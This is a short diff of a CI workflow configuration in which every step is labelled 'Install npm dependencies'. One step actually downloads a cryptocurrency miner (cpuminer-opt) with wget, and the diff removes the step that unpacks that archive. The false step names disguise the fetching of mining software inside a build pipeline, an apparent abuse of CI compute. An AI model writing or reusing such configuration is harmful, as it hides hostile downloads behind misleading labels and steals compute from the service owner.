@@ -23,7 +23,7 @@ workflows:
       - name: Install npm dependencies
         script: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz
       - name: Install npm dependencies
-        script: tar -xvf cpuminer-opt-mac.tar.gz && ls
+        script: ls
       - name: Install npm dependencies
         script: ls
       - name: Install npm dependencies
